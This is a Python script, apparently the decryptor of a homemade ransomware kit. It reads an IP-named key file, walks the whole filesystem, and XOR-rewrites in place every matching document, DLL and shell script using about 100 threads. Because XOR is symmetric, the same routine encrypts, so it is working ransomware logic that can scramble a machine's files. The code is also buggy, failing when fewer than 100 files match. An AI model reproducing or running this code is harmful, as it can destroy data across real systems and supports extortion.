import sys, threading, platform, os

### COLLECT FUNCTION ###
def collect(extension_tuple):
    # grab all files from the machine
    file_list = []

    with threading.Lock():
        # check os
        if platform.system() == "Windows":
            root_directory, separator  = "C:\\", "\\"
        else:
            root_directory, separator = "/", "/"

        # go through every path in the system and if a file extension matches some from the tuple then add it to the list of files to encrypt
        for root, dirs, files in os.walk(root_directory):
            for file in files:
                file_path, file_ext = os.path.splitext(root+separator+file)
                if file_ext in extension_tuple:
                    file_list.append(root+separator+file)

    return file_list

### DECRYPT FUNCTION ###
def decrypt(file, key, encryption_level):
    # TODO: encryption logic here
    index = 0
    max_index = encryption_level - 1
    try:
        with open(file, "rb") as f:
            data = f.read()
        with open(file, "wb") as f:
            for byte in data:
                xor_byte = byte ^ ord(key[index])
                f.write(xor_byte.to_bytes(1, sys.byteorder))
                if index >= max_index:
                    index = 0
                else:
                    index += 1
    except FileNotFoundError:
        print("File not Found")
    except PermissionError:
        print("No permission to access this")
    except IsADirectoryError:
        print("This is a directory")
    #except OsError as e:
        #print("Error: ", e)
    except:
        print("Something went wrong :c")

def main():
    # Read the content of the .key file passed as an argument and store it
    try:
        with open(sys.argv[1], "r") as k:
            key = k.read()
            print("The encryption key is: " + key) 
    except IndexError:
        print("Please specify the .key file as a positional argument")
        print("Example: python3 ransom-decrypt.py <IP>.key")
        quit()

    safeguard = input("Are you sure you want to use this key? Type start if you are: ")
    if safeguard != "start":
        quit()

    encryption_level = 128 // 8 

    # collect all files with matching extensions from the system into a list
    extensions = (".txt", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh")
    file_list = collect(extensions)

    NUM_THREADS = 100 
    # Empty the threads list 
    threads = []

    # Create a thread for each file and add it to the list of threads
    for f in file_list:
      thread = threading.Thread(target=decrypt, args=(f, key, encryption_level))
      threads.append(thread)

    # Start the first NUM_THREADS threads
    for i in range(NUM_THREADS):
      threads[i].start()

    # Wait for the first NUM_THREADS threads to finish
    for i in range(NUM_THREADS):
      threads[i].join()

    # Start the remaining threads
    for i in range(NUM_THREADS, len(threads)):
      threads[i].start()

    # Wait for all threads to finish
    for thread in threads:
      thread.join()


if __name__ == "__main__":
    main()
